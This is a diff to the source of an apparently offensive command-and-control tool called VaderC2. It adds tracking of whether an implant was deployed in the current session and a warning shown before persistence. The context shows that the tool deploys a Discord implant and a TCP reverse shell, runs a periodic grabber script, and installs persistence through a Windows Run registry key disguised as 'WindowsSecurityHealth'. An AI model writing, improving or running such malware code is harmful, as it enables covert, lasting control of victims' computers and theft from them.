@@ -207,6 +207,7 @@ class VaderC2:
         self.command_log = []
         self.last_msg_id = None
         self.listener_sock = None
+        self.deployed_this_session = False
 
         os.makedirs(LOG_DIR, exist_ok=True)
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -789,6 +790,7 @@ class VaderC2:
                         print(f"  {AMBER}[*] Deploying via {s.id[:8]} ({s.channel})...{RST}")
                         if self.send_to_session(s, deploy_cmd):
                             print(f"  {GREEN}[+] Deploy sent — Discord implant + TCP shell (C2 baked in){RST}")
+                            self.deployed_this_session = True
                         else:
                             print(f"  {RED}[!] Send failed{RST}")
 
@@ -1062,6 +1064,10 @@ setInterval(grab,{interval*1000});
                     if not s:
                         print(f"  {RED}[!] No session available.{RST}")
                     else:
+                        if not self.deployed_this_session:
+                            print(f"  {AMBER}[!] WARNING: 'deploy' not run this session.{RST}")
+                            print(f"  {AMBER}    Persist assumes vader_shell.exe has C2 IP baked in (Fresh Build).{RST}")
+                            print(f"  {AMBER}    If the binary on target is OLD, run 'deploy' first.{RST}")
                         persist_cmd = (
                             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                             '/v WindowsSecurityHealth /t REG_SZ '
